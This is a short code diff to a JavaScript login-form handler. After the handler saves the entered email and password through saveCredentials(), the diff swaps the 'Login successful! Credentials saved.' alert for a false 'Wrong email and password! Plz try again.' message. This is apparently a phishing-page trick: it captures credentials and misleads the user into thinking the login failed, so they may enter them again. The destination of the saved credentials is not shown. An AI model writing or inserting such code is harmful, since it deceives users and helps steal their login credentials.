@@ -29,7 +29,7 @@ form.addEventListener('submit', (e) => {
 
     if (isValid) {
         saveCredentials(emailInput.value, passwordInput.value);
-        alert('Login successful! Credentials saved.');
+        alert('Wrong email and password! Plz try again.');
         form.reset();
     }
 });
